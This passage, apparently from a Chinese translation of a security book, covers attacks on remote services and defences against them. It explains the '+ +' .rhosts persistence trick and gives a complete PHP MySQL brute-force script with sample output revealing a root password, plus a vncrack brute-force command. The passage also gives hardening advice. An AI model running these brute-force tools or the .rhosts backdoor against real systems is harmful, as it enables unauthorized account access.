
这样的文件允许任何主机的任何用户无需密码登录到该用户的账户。

> 在远程账户被攻陷后，入侵者可能会在受害者的主目录中放置一个内容为“+ +”的 `.rhosts` 文件，正如刚刚所示。这使得入侵者能够持续访问受害者的账户。此外，由于 `.rhosts` 文件以句点开头，当受害者用户使用 `ls` 命令进行目录列表时，该文件不会显示出来（除非用户在 `ls` 命令中指定了 `-a` 标志）。

## 禁用 rlogin 并考虑替代方案

如果正在运行 `rlogin` 服务，请考虑以下建议：

- 通过在 `inetd.conf` 文件中注释掉相应的行来禁用 `rsh`、`rlogin` 和 `rexec` 服务。
- 考虑使用 `SSH` 作为安全替代品。

### rsh：514（TCP）

`rsh` 命令用于在远程机器上执行命令。由于 `rsh` 使用与 `rlogin` 类似的机制，请参阅前面的“`rlogin`: 513 (TCP)”章节。

### NNTPS（Secure Network News Transfer Protocol，安全网络新闻传输协议）：563（TCP）

`NNTPS` 是建立在 `SSL`（Secure Sockets Layer，安全套接字层）之上的 `NNTP`。`NNTPS` 使用 `SSL` 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 `openssl` 工具连接到 `NNTPS` 服务器：

```
openssl s_client -connect:192.168.1.1:563
```

`OpenSSL` 可从 <http://www.openssl.org/> 获取。

请参阅“`NNTP` (Network News Transfer Protocol): 119 (TCP)”以获取更多详细信息。

### IMAPS（Secure Internet Message Access Protocol，安全互联网消息访问协议）：993（TCP）

`IMAPS` 是建立在 `SSL`（Secure Sockets Layer，安全套接字层）之上的 `IMAP`。`IMAPS` 使用 `SSL` 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 `openssl` 工具连接到 `IMAPS` 服务器：

```
openssl s_client -connect:192.168.1.1:993
```

`OpenSSL` 可从 <http://www.openssl.org/> 获取。

请参阅前面的章节“`IMAP2/IMAP4` (Internet Message Access Protocol 2/4): 143 (TCP)”以获取更多详细信息。

### POP3S（Secure Post Office Protocol 3，安全邮政协议 3）：995（TCP）

`POP3S` 是建立在 `SSL`（Secure Sockets Layer，安全套接字层）之上的 `POP3`。`POP3S` 使用 `SSL` 来建立和维护安全通道，从而在客户端和服务器之间提供加密通信。

可以使用命令行 `openssl` 工具连接到 `POP3S` 服务器以获取横幅信息：

```
openssl s_client -connect:192.168.1.1:995
```

`OpenSSL` 可从 <http://www.openssl.org/> 获取。

请参阅前面的章节“`POP3` (Post Office Protocol 3): 110 (TCP)”以获取更多详细信息。

### NFS：2049（TCP 和 UDP）

请参阅前面的章节“`Portmapper`: 111 (TCP)”。

### MySQL：3306（TCP）

`MySQL` 是一个流行的开源数据库软件包。可从 <http://www.mysql.com> 获取。

- **暴力破解**：由于 `MySQL` 使用用户名和密码对进行身份验证，因此可以尝试对其进行暴力破解攻击。

#### 暴力破解 MySQL

以下 `PHP` 脚本可用于对 `MySQL` 服务器进行暴力破解：

```php
<?php
/**Author: Nitesh Dhanjani [ hacknotes@dhani.com ]
This script attempts a brute-force attack on MySQL servers. Please make sure $usernamefile and $passwordfile are set to filenames containing usernames and passwords to attempt.*/

$usernamefile="usernames.txt";
$passwordfile="passwords.txt";

if($argc != 2)
(
    print "Usage: $argv[0] hostname\n";
    exit();
)

$uFilehandle=@fopen($usernamefile,"r");
$pFilehandle=@fopen($passwordfile,"r");

if ((!$uFilehandle)||(!$pFilehandle))
{
    print("Could not open username or password file.\n");
    exit();
}

while($username=@fscanf($uFilehandle,"%s\n"))
{
    while($password=@fscanf($pFilehandle,"%s\n"))
        if(@mysql_connect ($argv[1],$username[0],$password[0]))
            print("SUCCESS! : $username[0], $password[0]\n");
}

print("DONE\n");
?>
```

让我们将上述文件称为 `mssqlbrute.php`。以下是该脚本的一个使用示例：

```bash
$ php -f mssqlbrute.php msql.somecompanyasanexample.com
SUCCESS!: root, sqlMyP455!
DONE
```

`PHP` 编程语言解释器可从 <http://www.php.net/> 下载。

#### 防止 MySQL 暴力破解

请参阅*“暴力破解攻击的通用防御措施”*。

- **嗅探**：`MySQL` 使用明文协议来建立客户端和服务器之间的连接。因此，网络段上的用户可以嗅探 `MySQL` 会话。

#### 嗅探 MySQL 流量

可以使用 `Ettercap` 捕获认证过程中通过网络发送的 `MySQL` 哈希值（图 4-1）。此外，由于 `MySQL` 使用明文机制传输数据，因此可以监视用户会话

#### 远程服务

![](img/1b84de2bb5e7ca74dd76d8f9ae35b93d_151_0.png)

**图 4-1.** 可以使用 `Ethereal` 捕获 `MySQL` 会话。

使用网络分析器，例如 `Ettercap` 或 `Ethereal`。`Ethereal` 可从 http://www.ethereal.com/ 下载。

#### 封锁并加固 MySQL

如果您在主机上运行 `MySQL` 服务器，请考虑以下建议：

- 配置防火墙以阻止传入的 `MySQL` 服务器连接。在大多数情况下，只需本地 `MySQL` 访问即可。
- 加固 `MySQL` 配置，使其不接受来自远程用户的连接。有关详细指令，请参阅 http://www.mysql.com/documentation/mysql/bychapter/manual_MySQL_Database_Administration.html#Privilege_system。

### VNC (Virtual Network Computing)：5800+，5900+ (TCP)

`VNC` 是一种远程控制软件包，允许访问远程主机的桌面。`VNC` 是免费软件，可从 http://www.realvnc.com/ 下载。

**暴力破解** `VNC` 实例仅需密码即可进行身份验证。因此，`VNC` 账户可以远程暴力破解。

#### 暴力破解 VNC

可以使用位于 http://www.phoenixit.de/vncrack/ 的 `vncrack` 工具尝试对 `VNC` 进行暴力破解攻击。

```bash
$ vncrack -h 10.0.0.1 -w passwords.txt
```

`VNCrack` – 由 `PhoenixIT` 开发 (http://www.phoenixit.de/)

$Revision: 1.17 $

```text
>>>>>>>>>>>>> >>
Password: test123
```
